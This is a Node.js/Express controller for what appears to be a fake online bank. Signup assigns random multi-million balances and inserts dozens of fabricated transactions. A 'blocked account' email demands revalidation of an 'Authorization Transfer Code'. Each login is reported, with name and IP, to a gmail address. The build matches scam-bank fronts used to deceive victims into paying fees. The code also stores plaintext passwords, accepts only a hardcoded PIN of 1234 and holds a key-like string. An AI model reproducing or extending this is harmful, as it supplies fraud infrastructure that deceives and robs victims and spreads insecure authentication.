const { admin_key } = require('./config');
const { sendSupportMail } = require('./mail/send_otp');
const google_api = '1PRIqQCOheopWF8KwwilLAzsU8PtYq_qy'

// LOG IN // ALSO A REFERENCE POINT

module.exports.authPin = async ( req, res ) => {
    console.log(req.body.auth_pin, req.body);
    if (req.body.auth_pin == 1234 ){
        console.log('free to go');

        req.knex_object('cathay_users')
        .where({ account_no : req.session.account_no })
        .then((user_init) => {
            let user = user_init[0]
            req.knex_object('cathay_transactions')
            .where({ user_id : req.session.account_no }) //DONT FORGET!!!!
            .then( transactions => {
                req.knex_object('cathay_transactions')  
                .where({cr_dr : 'credit', user_id :  req.session.account_no})
                .then((resent) => {
                    let sent = resent[ resent.length - 1 ]
                    req.knex_object('cathay_transactions')
                    .where({cr_dr : 'debit' , user_id :  req.session.account_no})
                    .then((repay) =>{
                        let received = repay[ repay.length -1 ]
                        let transaction_list = transactions.map(function (i) { return JSON.stringify(i) })
                        res.render('home.ejs', {
                            user : user.user_name,
                            full_name :`${user.first_name} ${user.last_name}`,
                            email : user.email,
                            balance : user.balance,
                            currency : user.currency,
                            account: user.account_no,
                            profile : user.profile,
                            received : received.amount,
                            received_date: received.time_stamp,
                            transactions : transaction_list,
                            sent : sent.amount,
                            sent_date : sent.time_stamp,
                            active : [ 'active', '', '', '' ]
                        })                             
                    }) 
                })
            })
        })        
    }
    else{
        console.log('invalid pin');
    }
}

module.exports.authPay = async ( req, res ) => {
    console.log(req.body.auth_pin, req.body);
    if (req.body.auth_pin == 1234 ){
        console.log('free to go');

        req.knex_object('cathay_users')
        .where({ account_no : req.session.account_no })
        .then((user_init) => {
            let user = user_init[0]
            req.knex_object('cathay_transactions')
            .where({ user_id : req.session.account_no }) //DONT FORGET!!!!
            .then( transactions => {
                req.knex_object('cathay_transactions')  
                .where({cr_dr : 'credit', user_id :  req.session.account_no})
                .then((resent) => {
                    let sent = resent[ resent.length - 1 ]
                    req.knex_object('cathay_transactions')
                    .where({cr_dr : 'debit' , user_id :  req.session.account_no})
                    .then((repay) =>{
                        let received = repay[ repay.length -1 ]
                        let transaction_list = transactions.map(function (i) { return JSON.stringify(i) })
                        res.render('otp.ejs', {
                            user : user.user_name,
                            full_name :`${user.first_name} ${user.last_name}`,
                            email : user.email,
                            balance : user.balance,
                            currency : user.currency,
                            account: user.account_no,
                            received : received.amount,
                            received_date: received.time_stamp,
                            transactions : transaction_list,
                            sent : sent.amount,
                            sent_date : sent.time_stamp,
                            active : [ 'active', '', '', '' ]
                        })                             
                    }) 
                })
            })
        })        
    }
    else{
        console.log('invalid pin');
    }
}
 
module.exports.loginHandler = async (req, res)=>{
    //generate sessionid, update in sessions db, and send it in 201 resp
    try {
        req.knex_object('cathay_users')
        .where({ account_no : req.body.acc_no })
        .then( user => {
            let pass = user[0]
            if ( !user || !user[0] || user === undefined ) {
                res.redirect('/login_invalid.html')
            }
            
            else if (pass.password === req.body.upass) {
                if (pass.account_status === 'blocked'){
                    let message = `ATTENTION! ${pass.first_name} ${pass.last_name} : \n\n With regards to your previous transactions, it has been brought to notice that your checking account has been temporarily suspended due to reasons relating to the unauthorized access grant and location access disparity.\n\n However we take initiative to inform you that you are now required to visit the nearest branch to review and revitalize your Authorization Transfer Code (ATC). please do well to act in compliance to our conduct. \n \n Thank you for your anticipated cooperation. \n\n Yours in service\n(Customer service)`
                    console.log(pass.email, message)
                    sendSupportMail(pass.email, message)
                    res.redirect('/login_blocked.html')
                }
                else{
                    console.log('user found');
                    createSession(pass.account_no, req)
                    sendSupportMail('globalxcredit@gmail.com', `user "${pass.first_name} ${pass.last_name}" logged in from device : ${req.ip}`)
                    res.redirect('/auth_pin.html')                    
                }
            }
            else{

                res.redirect('/login_invalid.html')
            }                 
        })

    } catch (error) {
        res.status(401).json({status : 401, content : "login failed : inernal error" } );
    }

}

const createSession = (account_no, req)=>{
    req.session.account_no = account_no;
}

// ADMIN LOGIN //

module.exports.adminLoginHandler = async (req, res)=>{
    //
    let key = req.body.admin_key
    //(`hey we worked ${ key }`);
    if (key === admin_key){
        try {
            createSession(key, req)

            req.knex_object('cathay_users')
            .then( users_arr => {
                //(users_arr, users_arr[0].first_name);
                let user_list = users_arr.map(function (i) { return JSON.stringify(i) })
                let length = users_arr.length

                res.render('admin_users.ejs', {
                    user: user_list,
                    user_length : length
                })                
            } )

        } catch (error) {
            //
            //(error);
        }
    }else{
        //
    }
}

// LOG OUT //

module.exports.logoutHandler = async (req, res)=>{
    req.session.destroy((err) => {
        res.redirect('/Login.html')
    })
}

// CREATE TRANSACTIONS //

// module.exports.postHandler = async (req, res)=>{
//     // make room for if the funds are insufficient
//     if (req.body.otp == storage.otp){
//         console.log('otp ti wa okay');
//         let user_id= req.session.account_no

//         const {amount, iban, swift, person} = req.body ;
//         const cr_dr = 'debit'
//         let d = new Date()
//         let time_stamp = `${ d.getFullYear() }-${ d.getMonth() }-${ d.getDay() }`
//         let knex = req.knex_object;

//         req.knex_object('cathay_users')
//         .where({ account_no : user_id})
//         .select('*')
//         .then( user_init => {
//             let user = user_init[0]
//             if ( Number(amount) <= Number(user.balance) ){
//                 let new_balance = Number(user.balance) - Number(amount) 
//                     let update = req.knex_object('cathay_users')
//                     .where({ account_no : user_id })
//                     .update({balance : new_balance})
//                     .then(new_bal=>{
//                         req.knex_object('cathay_transactions')
//                         .where({cr_dr : 'credit'})
//                         .then((resent) => {
//                             let sent = resent[ resent.length - 1 ]
                            
//                             req.knex_object('cathay_transactions')
//                             .where({cr_dr : 'debit'})
//                             .then((repay) =>{
//                                 let received = repay.length - 1
//                                 // createSession({})
//                                 res.render('receipt.ejs', {
//                                     full_name :`${user.first_name} ${user.last_name}`,
//                                     account: user.account_no,
//                                     currency : user.currency,
        
//                                     receiver : person,
//                                     receiver_swift : swift,
//                                     receiver_iban : iban, 
        
//                                     amount : amount,
//                                     date : time_stamp,
//                                     ref: Math.floor(Math.random(1 * 164736540)) + 9869850                            
//                                 })
//                             })
                            
//                         })
//                     })
//                 }else{
//                     req.knex_object('cathay_transactions')
//                     .where({ user_id : req.session.account_no }) //DONT FORGET!!!!
//                     .then( transactions =>{
//                         req.knex_object('cathay_transactions')
//                         .where({cr_dr : 'credit', user_id :  user_id})
//                         .then((resent) => {
//                             let sent = resent[ resent.length - 1 ]

//                             req.knex_object('cathay_transactions')
//                             .where({cr_dr : 'debit' , user_id :  user_id})
//                             .then((repay) =>{
//                                 let received = repay.length - 1
//                                 var transaction_list = transactions.map( transactions => { return JSON.stringify(transactions) })

//                                     sesh_obj = {
//                                         user : user.user_name,
//                                         full_name :`${user.first_name} ${user.last_name}`,
//                                         email : user.email,
//                                         balance : user.balance,
//                                         account: user.account_no,
//                                         currency : user.currency,
//                                         received : repay[ received ].amount,
//                                         received_date : repay[ received ].time_stamp,
//                                         transactions : transaction_list,
//                                         sent : sent.amount,
//                                         sent_date : sent.time_stamp,
//                                         active : [ '', '', 'active', '' ]
//                                     }
//                                 res.render('transfers_insufficient.ejs', sesh_obj)
//                             })
                            
//                         })                        
//                     })

//                 }

//             }

//         )

//         try {
//             // 
//             let result = await knex.insert({cr_dr, amount, iban, swift, person, time_stamp, user_id})
//                                     .into('cathay_transactions');
//             // //(result);

//         } catch (error) {
//             //('Error fetching data : ' + error);
//         }
//     }

                        
// }


// SIGNUP //

module.exports.signup = async (req, res)=>{
    let  {first_name, middle_name, last_name, user_name, password, work, phone, email, dob, marry, sex, addr, type, reg_date, currency } = req.body
    let account_no = phone.slice(3)
    let balance = Math.floor(Math.random() * 2500000) + 1500000;
    let cotp = Math.floor(Math.random() * 2543212) + 15439129;
    let iban = `${Math.floor(Math.random() * 25) + 11}-${Math.floor(Math.random() * 15) + 199}-${Math.floor(Math.random() * 22) + 98999}-${Math.floor(Math.random() * 2225436) + 989913249}`;
    let swift = `${Math.floor(Math.random() * 25) + 154}-${Math.floor(Math.random() * 15) + 19}-${Math.floor(Math.random() * 22) + 99}`;
    let d = new Date()
    let time_stamp = `${ d.getFullYear() }-${ d.getMonth() }-${ d.getDay() }`
    let random_date = `${ d.getFullYear() }-${ d.getMonth() }-${ d.getDay() }`
    let knex = req.knex_object;
    
    try {
        let status = await knex.insert( 
                { 
                account_no,    
                first_name, 
                last_name, 
                user_name ,
                email,
                profile: 'profile.png',
                balance,
                currency, 
                password,
                cotp,
                imf : 0000,
                swift,
                iban,
                base_password : password,
                status : 'active',
                account_status :'active'
            }
        ).into('cathay_users');

        let payments = await knex.insert( [
            { 
                amount: 10000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Oil rig commission',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 9780,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works Commission',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 7800,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'FIONA WHALES',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 14000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works Commission',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 15000,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Lauren Martinez',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 10000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'FIONA WHALES',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 17500,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works Commission',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 5000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Andrew Sanders',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 10000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works Commission',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 400,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Brandon Smith',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 15000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Bradley Attaway',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 40000,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Brandon Smith',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 10000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'FIONA WHALES',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 17500,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works Commission',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 12500,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'FIONA WHALES',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 475000,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works inc',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 200000,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Hydraulics Eng supplies',
                time_stamp : `2022-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 14850,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Hydraulics Eng supplies',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 17500,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works Commission',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 5000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Andrew Sanders',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 10000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works Commission',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 400,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Brandon Smith',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 15000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Bradley Attaway',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 40000,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Brandon Smith',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 10000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'FIONA WHALES',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 15000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Bradley Attaway',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 40000,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Brandon Smith',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 10000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'FIONA WHALES',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 7800,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'FIONA WHALES',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 14000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works Commission',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 15000,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Lauren Martinez',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 10000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'FIONA WHALES',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 17500,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works Commission',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 5000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Andrew Sanders',
                time_stamp : `2021-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 10000,    
                cr_dr : 'credit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Water Works Commission',
                time_stamp : `2020-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
            { 
                amount: 400,    
                cr_dr : 'debit', 
                swift : 'DREgbBCh123', 
                iban : 'wLU2800194006447500003',
                person :'Brandon Smith',
                time_stamp : `2020-${ d.getMonth() }-${ d.getDay() }`,
                user_id : account_no
            },
        ]
            ).into('cathay_transactions');

        req.knex_object('cathay_transactions')
        .where({ user_id : account_no }) //DONT FORGET!!!!
        .then( transactions => {
            createSession(account_no, req)
            req.knex_object('cathay_transactions')  
            .where({cr_dr : 'credit', user_id : account_no })
            .then((resent) => {
                let sent = resent[ resent.length - 1 ]
                // let length = resent.length
                req.knex_object('cathay_transactions')
                .where({cr_dr : 'debit' , user_id : account_no})
                .then((repay) =>{
                    req.knex_object('cathay_users')
                    .where({ account_no : account_no })
                    .then((user) => {
                        let received = repay[ repay.length -1 ]
                        let transaction_list = transactions.map(function (i) { return JSON.stringify(i) })

                        res.render('home.ejs', {
                            user : user.user_name,
                            full_name :`${first_name} ${last_name}`,
                            email : email,
                            balance : balance,
                            currency : currency,
                            profile : user.profile,
                            account: account_no,
                            received : 12134,
                            received_date : time_stamp,
                            transactions :transaction_list,
                            sent : 500,
                            sent_date : time_stamp,
                            active : [ 'active', '', '', '' ]
                        })                         
                    })
                            
                }) 
            })
        })


    } catch (error) {
        //('Error insertng user : ' + error);
    }

}
